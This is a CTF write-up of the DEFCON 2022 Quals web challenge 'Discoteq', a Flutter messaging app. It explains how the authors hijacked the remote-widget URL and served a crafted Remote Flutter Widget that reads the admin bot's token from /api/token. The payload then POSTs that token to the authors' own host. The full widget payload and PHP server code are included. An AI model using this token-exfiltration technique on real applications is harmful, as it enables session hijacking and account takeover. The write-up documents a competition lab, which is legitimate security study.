---
title: "[Discoteq] - DEFCON Quals"
categories:
  - CTF
  - Write Up
tags:
  - CTF
  - Write-up
  - client-side
  - content-hijacking
  - flutter
---
![](banner-defcon-2022.png)
## Prologue

DEFCON CTF is one of the world's largest and most notable hacker conventions. The Finalist will get a free ticket to attend the conference in Las Vegas. This year, the organizer for this competition is Nautilus Institute (it's oooverflow in the past). DEFCON CTF lasts for 48 hours with 18 + 2 (warm-up) challenges.

## Write Up

### Discoteq (100pts)

#### TL;DR Solution

The vulnerability of this challenge is we could change the URL for the remote widget to our host. So, we could create a malicious widget to create a widget and the application will deserialize our malicious widget.

#### Detailed Explanation

The value of this challenge is 100 points and more than +30 players have solved this challenge.

![](discoteq-1.png)

We were given a website with given a desktop application. After seeing the desktop application, we could see the website is made with Flutter.

![](discoteq-2.png)

The contents of README.txt is below.

```
Discoteq! 
Introducing the newest easy, anonymous, secure, desktop messager app! 
 
Ps. There is no point in reversing this desktop binary, it is running the same code as the web app.
```

Based on the information above, We concluded there's no need to reverse-engineering the binary. So, we could analyze the javascript instead of reading the binary, and also, the desktop application should have the same code since it's written with flutter.

After skimming through line by line, We found a unique thing.

![](discoteq-3.png)

In those lines, there's a check where the URL is using the prefix https/http and the check is the suffix using image extension. And at the same time, the function name is `_sendChat$body$_HomePageState(targets)`. So, we assume this is a function where checking the body message.

So, we just sent a message with the exact condition needed.

![](discoteq-4.png)

As we can see, our message will generate an image. So, we attempted to send a message to check the admin bot.

![](discoteq-5.png)

Nice, we received a callback from the bot. Given the user agent, We could assume the bot is running on the desktop application instead of the browser.

What is the next step? We read, debug, and guess the challenge once again, and also gather the information as much as available. 

After playing around with the WebSocket traffics, We got an interesting error during a poll creation.

![](discoteq-6.png)

![](discoteq-7.png)

As we can see in the console log, We could see we were able to control the `widget` parameter (`data.apiGet` and `data.apiPost` too, but it's not involved with our write-up). Referring to [URL RFC](https://datatracker.ietf.org/doc/html/rfc1738#section-3.1), If we put `@domain.com` as our payload, It will change into `iscoteq-thl53at4nuzlm.shellweplayaga.me@domain.com` so it will change the remote domain into credentials authorization and sending a request to our domain instead.

But what is this at the `/widget/*` endpoint?. 

![](discoteq-8.png)

with our `google-fu` technique, we obtain a clue where it's related to `rfw` or `Remote Flutter Widget`. [Github](https://github.com/flutter/packages/tree/main/packages/rfw), [Documentation](https://pub.dev/documentation/rfw/latest/index.html)

![](discoteq-9.png)

And with the power of reading the example and the documentation, we found out how to decode the widget using [`decodeLibraryBlob`](https://pub.dev/documentation/rfw/latest/formats/decodeLibraryBlob.html).

```dart
import 'dart:io'; 
import 'package:rfw/formats.dart'; 
 
void main() { 
 var poll = new File('poll').readAsBytesSync(); 
 print(decodeLibraryBlob(poll)); 
}
```

![](discoteq-10.png)

We successfully decoded the widget. Unfortunately, it is not perfectly working to re-encode the file (the [encode.dart](https://github.com/flutter/packages/tree/main/packages/rfw/example/remote/remote_widget_libraries) is already provided in the example repository). So we tried to little bit patching the bug. 

(We take /widget/poll for example)

```dart
import core.widgets;
import core.material;
import local;

widget root = Container(
  
    child: Column(
      children: [
        Row(
          children: [
            Text(text: "From " ), 
            Text(
              text: data.author.user, 
              style: {color: 4278230474}
            )
          ]
        ), 
          Padding(
            padding: [0.0, 5.0, 0.0, 0.0], 
            child: Text(text: data.data.title)
          ), 
          switch state.loaded {
            true: Column(
              children: [
                ...for loop in data.poll_options: 
                  Row(
                    children: [
                      Padding(
                        child: 
                          ElevatedButton(
                            child: Text(text: loop.text), 
                            onPressed: event "api_post" {path: data.data.apiVote, body: {selection: loop.text}}
                          ), 
                        padding: [0.0, 5.0, 10.0, 0.0]
                      ), Text(text: loop.count)
                    ]
                  ), TextButton(
                    child: 
                      Text(text: "Refresh", style: {color: 4294942366}), 
                      onPressed: [set state.loaded = false]
                    )]
              ), 
            false: ApiMapper(
              url: data.data.apiGet,
              jsonKey: "options", 
              dataKey: "poll_options", 
              onLoaded: [set state.loaded = true]
            )
          }
        ]
      
    )
  
);
```

Even though we successfully re-encode the compiled file. For some reason, it still doesn't work on remote. So, we tried to re-code it with a basic widget functionality, and it surprisingly worked.

![](discoteq-11.png)

```dart
import core.widgets;
import core.material;
import local;

widget root = Container(
    child: Column(
      children: [
        Row(
          children: [
            Text(text: "sss " ), 
          ]
        ),  
      ]
    )
);
```

Our next todo is setting up the webserver to make a host for our compiled widget.

```php
<?php 
header('Access-Control-Allow-Origin: *'); 
echo file_get_contents($_GET['x']); 
?>
```

Our compiled widget is running perfectly. 

![](discoteq-12.png)

![](discoteq-13.png)

Ps. Every we make a widget request, it will be cached. So you need to refresh the page every time you create a new widget.

Since the bot visits our message, we make a bold assumption that we need to write a javascript in the message. Reading the flutter documentation, trying to import packages, and many more. But, there's nothing that is working. And, It took many hours to realize that we were actually on the wrong track.

We realize this after re-reading the decompiled widget, there's an `ApiMapper` function. We searched the documentation and didn't find anything. That means this is a custom function. So, we read the javascript (again).

![](discoteq-14.png)

We tried debugging and find that snippet code. Based on our understanding, and comparing our decoded widget, we assume `ApiMapper` is take parameters `"url"`, `"jsonKey"`, `"dataKey"`, and `"onLoaded"`.

![](discoteq-15.png)

And Our next finding of debugging is that snippet above. As we can see, at function `_loadRequest$body$_ApiMapperState(api_url)` it will be doing a magical thing where it will create a request and at case 2, it will get the response and put it to `$async$self._main$_result` variable.

![](discoteq-16.png)

And here is another next finding during debugging. At function `_updateIfReady$0()` is doing another magical thing. The gist of it is `t1` variable will store the response we got at `$async$self._main$_result` before. 

After that, the variable `resultForKey` is tried to get the value of object `t1` using `jsonKey` at the widget. So, the variable of `resultForKey` actually stores the value of the key (`jsonKey`) the response at widget `url`. 

After that, the `resultForKey` will be doing a loop and put it at the `values` variable. And then, at `_this._main$_data.update$2(0, _this._widget.dataKey, values);` it means the application will update the `data` at the widget using the `dataKey` parameter at `ApiMapper` before. It will store the response. And thanks to that, we could access the `dataKey` via widget. 

And the last thing is the `onLoaded` is doing a similar thing with the `onload` at javascript html event but it will be executed after the GET request is finished.

Since we already "a little bit" understand how the application work, we could create a widget using `ApiMapper` now.

But, there's another problem now. How do we know the response with those limitations?. While the widget deserialization is all done on the client-side. Not to mention, another limitation of `ApiMapper` is only making GET requests.

We are back at the decompiled widget before. At the `ElevatedButton` function, there's a key `onPressed` which has similar behavior to `onClick` at javascript html. It will invoke a registered event with the name `api_post`. So, based on the decompiled widget, we could pass the variable data to that event.

![](discoteq-17.png)

So, we back to the compiled javascript (again). With the snippet code above, we could assume it's just checking the event name and making a POST request to the given URL and body.

All the problem is already resolved. Our next step is crafting the payload.

`payload.rfwtxt`
```dart
import core.widgets;
import core.material;
import local;

widget root = Container(
    child: Column(
      children: [
        Row(
          children: [
            Text(text: "From " ), 
            Text(text: data.author.user, style: {color: 4278230474}),
            ApiMapper(
              url: "/api/token",
              jsonKey: "new_token",
              dataKey: "user_token",
              onLoaded: [true]
            ),
            
            ApiMapper(
              url: "@x.nyxmare.co:1234/",
              jsonKey: "something",
              dataKey: "something",
              onLoaded: [event "api_post" {path: "@x.nyxmare.co:1234/log.php", body: {from: "ApiMapper 2", ticket: data.user_token}}]
            ),
          ]
        ),  
      ]
    )
);
```

We're going to explain this. The first `ApiMapper` will make a GET request at `/api/token`. 

![](discoteq-18.png)

As we can see from the response of that endpoint, it has a `new_token` key with the value of the current token user. After that, the `ApiMapper` will set the `data` at widget (`user_token`) with the value of `jsonKey` from the response (`new_token`). And the `onLoaded` part is just doing nothing.

And for the 2nd `ApiMapper` will make a GET request to our host.

![](discoteq-19.png)

`index.php`
```php
<?php 
 
sleep(3); 
 
header('Access-Control-Allow-Origin: *'); 
header('Content-Type: application/json'); 
 
?> 
{"something":"nice"}
```

As we can see from the response of that endpoint, it is doing the same thing as the first. But the difference between the first is doing a `sleep` to give a time to the first `ApiMapper` finished to setting up `data` (We actually spend many hours at this part, and wondering why it rarely works. We also tried to spam bot and make hope it will work). So, after that, it will be an `onLoaded` event, where it's used for passing and sending the `data` widget to our log.

Ps. We actually tried to make only one `ApiMapper`, but for some reason, The `data` widget won't be updated during `onLoaded` 

¯\\\_(ツ)_/¯.

We already finished crafting the payload. The final step will be just to send a poll with our malicious widget.

![](discoteq-20.png)

![](discoteq-21.png)

![](discoteq-22.png)

Finally, we obtain the token admin. So, the final step is just to request the `/api/flag` with the token we got.

![](discoteq-23.png)

## Epilogue

The challenges given are very fun. And also, This is actually the hardest web challenge that I could solve during the competition. We learn new things about flutter.  _Kudos_ to the author of the challenge for giving us an entertaining challenge.



— nyxsorcerer
